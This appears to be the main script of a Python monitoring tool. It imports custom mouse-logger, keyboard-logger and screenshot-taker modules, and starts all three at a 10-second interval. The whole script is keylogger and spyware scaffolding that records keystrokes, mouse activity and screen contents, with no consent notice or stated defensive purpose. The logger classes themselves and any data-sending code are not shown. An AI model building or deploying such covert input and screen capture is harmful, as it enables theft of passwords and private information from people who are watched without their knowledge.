from mss import screenshot
from MouseLogger import MouseLogger
from KeyboardLogger import KeyboardLogger
from ScreenshotTaker import ScreenshotTaker

TIME_INTERVAL = 10



mouseLogger = MouseLogger(TIME_INTERVAL)
keyLogger =  KeyboardLogger(TIME_INTERVAL)
screenshotTaker = ScreenshotTaker(TIME_INTERVAL)

mouseLogger.start()
keyLogger.start()
screenshotTaker.start()
